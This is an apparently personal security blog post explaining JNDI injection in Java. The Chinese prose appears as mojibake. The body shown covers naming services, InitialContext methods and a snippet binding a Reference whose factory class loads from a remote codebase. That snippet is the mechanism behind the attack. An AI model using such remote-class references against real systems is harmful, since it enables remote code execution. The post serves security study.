<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="JNDIæ³¨å…¥æµ…æJNDIæ¦‚è¿°rmiï¼šå®¢æˆ·ç«¯é€šè¿‡rmiåè®®è¯·æ±‚åˆ°æœåŠ¡ç«¯çš„è¿œç¨‹ç±»ï¼Œå¹¶åŠ è½½æ‰§è¡Œ JNDIï¼ˆJava Naming and Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰ å‘½åæœåŠ¡ï¼šå‘½åæœåŠ¡æ˜¯ä¸€ç§ç®€å•çš„é”®å€¼å¯¹ç»‘å®šï¼Œå¯ä»¥é€šè¿‡é”®åæ£€ç´¢å€¼ï¼ŒRMIå°±æ˜¯å…¸å‹çš„å‘½åæœåŠ¡ ç›®å½•æœåŠ¡ï¼šç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„æ‹“å±•ã€‚å®ƒä¸å‘½åæœåŠ¡çš„åŒºåˆ«åœ¨äºå®ƒå¯ä»¥é€šè¿‡å¯¹è±¡å±æ€§æ¥æ£€ç´¢å¯¹è±¡  æ¯”å¦‚è¯´ï¼š  å‘½åæœåŠ¡ç¤ºä¾‹">
<meta property="og:type" content="article">
<meta property="og:title" content="JNDIæ³¨å…¥æµ…æ">
<meta property="og:url" content="https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/index.html">
<meta property="og:site_name" content="le0n&#39;s blogs">
<meta property="og:description" content="JNDIæ³¨å…¥æµ…æJNDIæ¦‚è¿°rmiï¼šå®¢æˆ·ç«¯é€šè¿‡rmiåè®®è¯·æ±‚åˆ°æœåŠ¡ç«¯çš„è¿œç¨‹ç±»ï¼Œå¹¶åŠ è½½æ‰§è¡Œ JNDIï¼ˆJava Naming and Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰ å‘½åæœåŠ¡ï¼šå‘½åæœåŠ¡æ˜¯ä¸€ç§ç®€å•çš„é”®å€¼å¯¹ç»‘å®šï¼Œå¯ä»¥é€šè¿‡é”®åæ£€ç´¢å€¼ï¼ŒRMIå°±æ˜¯å…¸å‹çš„å‘½åæœåŠ¡ ç›®å½•æœåŠ¡ï¼šç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„æ‹“å±•ã€‚å®ƒä¸å‘½åæœåŠ¡çš„åŒºåˆ«åœ¨äºå®ƒå¯ä»¥é€šè¿‡å¯¹è±¡å±æ€§æ¥æ£€ç´¢å¯¹è±¡  æ¯”å¦‚è¯´ï¼š  å‘½åæœåŠ¡ç¤ºä¾‹">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://0wlle0n.github.io/images/3601f4cbc141e3e07951413276407fc5.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/cd7b6c701c62f6ef9c14f6a2b9780001.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/9832a72dfa394ee925f0d68a213a9b88.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/9b86a64bff1978169fa023823597d50d.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/48a153e58368a6f6eba50b639cf6d682.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/c886b205d204a6020179c6c1f86d7f00.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/ee37beafe07f8018a4569828c0c1b7e0.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/f589b991d6a144117f10669b77ae09d7.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/3fa9ed28c565aeed58678094ab9f492a.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/ac13a3c78b7990723e1820775fee5211.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/71ee134ba60bbcfdb2feed5305e141d3.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/468b5c234655ff3c58cdfa6066326741.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/77ceec62f19bb233bd3d71434fe6b8db.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/d2fd2a9ebfcfc2fc948bcd3cfe81be8d.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/0d61328a3bf85f179e09b44bdf7af404.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/3b2b3a2078c01ab75363aa7a0dfa15ab.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/fc93ee17bdc38590f4d5a5fcd5119349.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/227147d5b7e7f626fa7ba69736e7b353.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/f593cc160fbc40e577ccbf4e333aa70c.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/ed2148d49a2036f1aae0b6562a0e7f5d.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/8d9092733364ab4764fb67a9c5520922.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/33065fd05fe845f846b35ef3552bdef0.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/ecb34c94b432792318214218c3ad1878.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/80be4233c44618f0bef965207187ec9c.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/e02da44a8632f37d82e4f5e98acb3447.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/580c35600777e3071f0db4ed93d224ec.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/3cfd780370368f07e8974a581d455376.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/1bd5f236bbb290c2e62c38b2a1358b64.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/b9eb9193e084a8f0fc5a042bc80431ba.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/006d07d1f022f3b61f03feaf8ebd9dca.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/4947e32769ff1163ab23bd84ddc793fa.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/a327401467d879dcce864f701db0558f.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/770eb3cadc81aaee41d2f89606acb011.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/834447f46c06ab82bf443f1a1782a758.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/1538f64fce911888a602cc5fc93e8a05.png">
<meta property="og:image" content="https://0wlle0n.github.io/images/d3384eb31d24b429da5756266b60ba5b.png">
<meta property="article:published_time" content="2025-03-25T03:31:47.000Z">
<meta property="article:modified_time" content="2025-03-25T08:05:41.706Z">
<meta property="article:author" content="le0n">
<meta property="article:tag" content="javaå®‰å…¨">
<meta property="article:tag" content="JNDIæ³¨å…¥">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://0wlle0n.github.io/images/3601f4cbc141e3e07951413276407fc5.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>JNDIæ³¨å…¥æµ…æ</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/friends">friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/03/24/NCTF2024-web-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&text=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&title=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&is_video=false&description=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=JNDIæ³¨å…¥æµ…æ&body=Check out this article: https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&title=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&title=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&title=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&title=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&name=JNDIæ³¨å…¥æµ…æ&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&t=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">JNDIæ³¨å…¥æµ…æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">JNDIæ¦‚è¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rmi%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">rmiï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%EF%BC%88Java-Naming-and-Directory-Interface%EF%BC%8CJava%E5%91%BD%E5%90%8D%E5%92%8C%E7%9B%AE%E5%BD%95%E6%8E%A5%E5%8F%A3%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">JNDIï¼ˆJava Naming and Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">JNDIå…·ä½“å®ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InitialContext%E7%B1%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">InitialContextç±»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-Naming-Reference"><span class="toc-number">1.2.2.</span> <span class="toc-text">JNDI Naming Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">JNDIæ³¨å…¥åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI-JNDI"><span class="toc-number">1.4.</span> <span class="toc-text">RMI+JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">è°ƒè¯•è¿‡ç¨‹ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lookup"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">lookup</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getURLOrDefaultInitCtx"><span class="toc-number">1.4.1.1.1.</span> <span class="toc-text">getURLOrDefaultInitCtx</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lookup-1"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">lookup</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getRootURLContext"><span class="toc-number">1.4.1.2.1.</span> <span class="toc-text">getRootURLContext</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lookup-2"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">lookup</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP-JNDI"><span class="toc-number">1.5.</span> <span class="toc-text">LDAP+JNDI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">1.6.</span> <span class="toc-text">è°ƒè¯•è¿‡ç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lookup-3"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">lookup</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getRootURLContext-1"><span class="toc-number">1.6.0.1.1.</span> <span class="toc-text">getRootURLContext</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#getUsingURLIgnoreRootDN"><span class="toc-number">1.6.0.1.1.1.</span> <span class="toc-text">getUsingURLIgnoreRootDN</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lookup-4"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">lookup</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#lookup-5"><span class="toc-number">1.6.0.2.1.</span> <span class="toc-text">lookup</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#p-lookup"><span class="toc-number">1.6.0.2.1.1.</span> <span class="toc-text">p_lookup</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#c-lookup"><span class="toc-number">1.6.0.2.1.2.</span> <span class="toc-text">c_lookup</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#decodeObject"><span class="toc-number">1.6.0.2.1.3.</span> <span class="toc-text">decodeObject</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#decodeReference"><span class="toc-number">1.6.0.2.1.4.</span> <span class="toc-text">decodeReference</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#c-lookup-1"><span class="toc-number">1.6.0.2.1.5.</span> <span class="toc-text">c_lookup</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#getObjectInstance"><span class="toc-number">1.6.0.2.1.6.</span> <span class="toc-text">getObjectInstance</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%BB%95%E8%BF%87%EF%BC%9A%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E5%BD%93Reference-Factory"><span class="toc-number">1.7.</span> <span class="toc-text">é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šç”¨æœ¬åœ°Classå½“Reference Factory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tomcat8-5-0"><span class="toc-number">1.7.1.</span> <span class="toc-text">tomcat8.5.0</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B%EF%BC%9A-1"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">è°ƒè¯•è¿‡ç¨‹ï¼š</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%BB%95%E8%BF%87%EF%BC%9A%E5%88%A9%E7%94%A8LDAP%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget"><span class="toc-number">1.8.</span> <span class="toc-text">é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šåˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        JNDIæ³¨å…¥æµ…æ
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">le0n</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-03-25T03:31:47.000Z" class="dt-published" itemprop="datePublished">2025-03-25</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/JNDI%E6%B3%A8%E5%85%A5/" rel="tag">JNDIæ³¨å…¥</a>, <a class="p-category" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">javaå®‰å…¨</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="JNDIæ³¨å…¥æµ…æ"><a href="#JNDIæ³¨å…¥æµ…æ" class="headerlink" title="JNDIæ³¨å…¥æµ…æ"></a>JNDIæ³¨å…¥æµ…æ</h1><h2 id="JNDIæ¦‚è¿°"><a href="#JNDIæ¦‚è¿°" class="headerlink" title="JNDIæ¦‚è¿°"></a>JNDIæ¦‚è¿°</h2><h3 id="rmiï¼š"><a href="#rmiï¼š" class="headerlink" title="rmiï¼š"></a><strong>rmiï¼š</strong></h3><p>å®¢æˆ·ç«¯é€šè¿‡rmiåè®®è¯·æ±‚åˆ°æœåŠ¡ç«¯çš„è¿œç¨‹ç±»ï¼Œå¹¶åŠ è½½æ‰§è¡Œ</p>
<h3 id="JNDIï¼ˆJava-Naming-and-Directory-Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰"><a href="#JNDIï¼ˆJava-Naming-and-Directory-Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰" class="headerlink" title="JNDIï¼ˆJava Naming and Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰"></a><strong>JNDI</strong>ï¼ˆJava Naming and Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰</h3><ul>
<li><strong>å‘½åæœåŠ¡</strong>ï¼šå‘½åæœåŠ¡æ˜¯ä¸€ç§ç®€å•çš„é”®å€¼å¯¹ç»‘å®šï¼Œå¯ä»¥é€šè¿‡é”®åæ£€ç´¢å€¼ï¼ŒRMIå°±æ˜¯å…¸å‹çš„å‘½åæœåŠ¡</li>
<li><strong>ç›®å½•æœåŠ¡</strong>ï¼šç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„æ‹“å±•ã€‚å®ƒä¸å‘½åæœåŠ¡çš„åŒºåˆ«åœ¨äºå®ƒå¯ä»¥é€šè¿‡å¯¹è±¡å±æ€§æ¥æ£€ç´¢å¯¹è±¡</li>
</ul>
<p>æ¯”å¦‚è¯´ï¼š</p>
<ul>
<li><strong>å‘½åæœåŠ¡ç¤ºä¾‹ï¼ˆDNSï¼‰ï¼š</strong><ul>
<li>æŸ¥è¯¢ <code>example.com</code> â†’ è¿”å› <code>192.168.1.1</code>ï¼ˆIP åœ°å€ï¼‰<br>ğŸ‘‰ é€šè¿‡åå­—æ‰¾åˆ° IP åœ°å€</li>
</ul>
</li>
<li><strong>ç›®å½•æœåŠ¡ç¤ºä¾‹ï¼ˆLDAPï¼‰ï¼š</strong><ul>
<li>æŸ¥è¯¢ <code>(cn=å¼ ä¸‰)</code> â†’ è¿”å› <code>&#123;å§“å=å¼ ä¸‰, é‚®ç®±=zhangsan@example.com, éƒ¨é—¨=IT&#125;</code><br>ğŸ‘‰ é€šè¿‡åå­—æˆ–å±æ€§æ‰¾åˆ°å®Œæ•´çš„ç”¨æˆ·ä¿¡æ¯</li>
</ul>
</li>
</ul>
<p>è€Œ<strong>JNDI</strong>åˆ™æ˜¯å¯¹rmiå’ŒLDAPè¿™ç§æœåŠ¡è¿›è¡Œäº†å°è£…ï¼Œç”¨åŒæ ·çš„è¯­å¥å°±èƒ½è½»æ¾ä½¿ç”¨è¿™äº›ä¸åŒçš„æœåŠ¡ã€‚</p>
<h2 id="JNDIå…·ä½“å®ç°"><a href="#JNDIå…·ä½“å®ç°" class="headerlink" title="JNDIå…·ä½“å®ç°"></a>JNDIå…·ä½“å®ç°</h2><h3 id="InitialContextç±»"><a href="#InitialContextç±»" class="headerlink" title="InitialContextç±»"></a>InitialContextç±»</h3><p><code>InitialContext initialContext = new InitialContext();</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ã€‚</span></span><br><span class="line">bind(Name name, Object obj) </span><br><span class="line"><span class="comment">//æšä¸¾åœ¨å‘½åä¸Šä¸‹æ–‡ä¸­ç»‘å®šçš„åç§°ä»¥åŠç»‘å®šåˆ°å®ƒä»¬çš„å¯¹è±¡çš„ç±»åã€‚</span></span><br><span class="line">list(String name) </span><br><span class="line"><span class="comment">//æ£€ç´¢å‘½åå¯¹è±¡ã€‚</span></span><br><span class="line">lookup(String name) </span><br><span class="line"><span class="comment">//å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ï¼Œè¦†ç›–ä»»ä½•ç°æœ‰ç»‘å®šã€‚ </span></span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line"><span class="comment">//å–æ¶ˆç»‘å®šå‘½åå¯¹è±¡ã€‚</span></span><br><span class="line">unbind(String name)</span><br></pre></td></tr></table></figure>

<h3 id="JNDI-Naming-Reference"><a href="#JNDI-Naming-Reference" class="headerlink" title="JNDI Naming Reference"></a>JNDI Naming Reference</h3><p>javax.namingè¿˜æä¾›äº†ä¸€ä¸ªReferenceç±»å¯ä»¥åŒ…è£…å¦ä¸€ä¸ªè¿œç¨‹ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡æ„é€ ä¸€ä¸ªæ–°çš„å¼•ç”¨ã€‚  </span></span><br><span class="line">Reference(String className) </span><br><span class="line"><span class="comment">//ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡å’Œåœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚ </span></span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line"><span class="comment">//ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ï¼Œå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®ä»¥åŠå¯¹è±¡çš„åœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚ </span></span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line"><span class="comment">//ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ä»¥åŠå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚ </span></span><br><span class="line">Reference(String className, String factory, String factoryLocation)  </span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å</span></span><br><span class="line"><span class="comment">// ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦åŠ è½½çš„ç±»çš„å®Œæ•´ç±»å</span></span><br><span class="line"><span class="comment">// ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯è¿œç¨‹classæ–‡ä»¶å­˜æ”¾çš„åœ°å€äº†ï¼Œå¯ä»¥æ˜¯file/ftp/httpåè®®</span></span><br><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;refClassName&quot;</span>, <span class="string">&quot;insClassName&quot;</span>, <span class="string">&quot;http://example.com:8888/&quot;</span>); </span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯è·å–è¿œç¨‹å¯¹è±¡ï¼Œè·å–åˆ°<code>Reference</code>ç±»ï¼Œå†é€šè¿‡å®ƒè§£æå‡ºå¦ä¸€ä¸ªè¿œç¨‹å¯¹è±¡</p>
